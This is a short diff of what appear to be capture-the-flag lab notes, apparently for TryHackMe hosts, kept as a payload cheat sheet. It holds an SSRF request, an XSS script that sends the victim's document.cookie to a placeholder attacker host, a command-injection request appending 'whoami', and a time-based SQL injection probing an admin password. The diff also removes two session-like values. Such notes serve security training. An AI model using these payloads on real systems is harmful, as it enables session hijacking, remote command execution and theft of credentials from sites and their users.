@@ -27,5 +27,9 @@ http://website.thm/stock?server=api.website.thm/api/user&x&id=123
 
 #XSS
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
-session=9392c12a40773afcedfd7f2ee0f3de3f
-4AB305E55955197693F01D6F8FD2D321
+
+#Command Injection
+curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
+
+#SQLI
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--
